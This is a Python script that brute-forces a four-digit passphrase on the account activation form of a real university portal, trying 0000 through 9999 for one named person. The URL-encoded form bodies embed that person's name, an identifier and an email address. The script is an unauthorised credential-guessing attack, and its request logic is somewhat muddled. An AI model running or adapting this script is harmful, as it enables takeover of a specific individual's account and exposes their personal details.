import os
import requests

def main():
    client = requests.Session()

    passport = 0
    while passport < 10000:
        print("\n\n\n\n\n\npassport: {}\n".format(passport))

        body = ""
        if passport < 10:
            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=000{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
        elif passport < 100:
            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=00{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
        elif passport < 1000:
            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=0{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
        elif passport < 10000:
            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D={}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)

        client = requests.post('https://lk.misis.ru/method/schedule.get', body)
        if ("К сожалению нам не удалось найти сотрудника" in client.text or passport < 1):
            print(client.text)

        passport = passport + 1

if __name__ == '__main__':
    main()
